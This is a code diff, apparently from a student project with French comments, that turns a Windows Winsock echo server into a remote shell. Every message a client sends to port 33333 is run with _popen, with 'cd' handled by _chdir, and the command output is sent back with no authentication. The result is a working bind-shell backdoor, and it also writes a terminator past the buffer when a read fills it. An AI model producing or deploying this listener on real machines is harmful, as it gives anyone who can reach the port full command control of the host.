@@ -8,12 +8,58 @@
 #include <stdlib.h>
 #include <stdio.h>
 
+// Notre ajouts
+#include <string>
+#include <direct.h>
+
+// https://stackoverflow.com/questions/478898/how-do-i-execute-a-command-and-get-the-output-of-the-command-within-c-using-po
+#include <iostream>
+#include <stdexcept>
+#include <stdio.h>
+#include <string>
+
 // Need to link with Ws2_32.lib
 #pragma comment (lib, "Ws2_32.lib")
 // #pragma comment (lib, "Mswsock.lib")
 
-#define DEFAULT_BUFLEN 512
+#define DEFAULT_BUFLEN 500000
 #define DEFAULT_PORT "33333"
+
+using namespace std;
+
+std::string exec(const char* cmd) {
+    char buffer[128];
+    std::string result = "";
+
+    // Notre ajout
+    if (cmd[0] == 'c' && cmd[1] == 'd' && cmd[2] == ' ') {
+        string directory = "";
+        for (int i = 3; i < strlen(cmd); i++) {
+            directory += cmd[i];
+        }
+        _chdir(directory.c_str());
+        return "OKAY CHDIR";
+    }
+
+    FILE* pipe = _popen(cmd, "r");
+    if (!pipe) throw std::runtime_error("popen() failed!");
+    try {
+        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
+            result += buffer;
+        }
+    }
+    catch (...) {
+        _pclose(pipe);
+        throw;
+    }
+    _pclose(pipe);
+
+    // Notre ajout
+    if (result == "") {
+        return "OKAY";
+    }
+    return result;
+}
 
 int __cdecl main(void)
 {
@@ -93,12 +139,13 @@ int __cdecl main(void)
     closesocket(ListenSocket);
 
     // Receive until the peer shuts down the connection
+
     do {
 
         iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
         if (iResult > 0) {
             printf("Bytes received: %d\n", iResult);
-            printf("Message from client : ", recvbuf);
+            printf("Message from client: ");
 
             for (int i = 0; i < iResult; i++)
             {
@@ -106,8 +153,16 @@ int __cdecl main(void)
             }
             printf("\n");
 
+            char * cmd = recvbuf;
+            cmd[iResult] = '\0';
+
+            // https://stackoverflow.com/questions/478898/how-do-i-execute-a-command-and-get-the-output-of-the-command-within-c-using-po
+
+            string output;
+            output = exec(cmd);
+
             // Echo the buffer back to the sender
-            iSendResult = send(ClientSocket, recvbuf, iResult, 0);
+            iSendResult = send(ClientSocket, output.c_str(), output.size(), 0);
             if (iSendResult == SOCKET_ERROR) {
                 printf("send failed with error: %d\n", WSAGetLastError());
                 closesocket(ClientSocket);
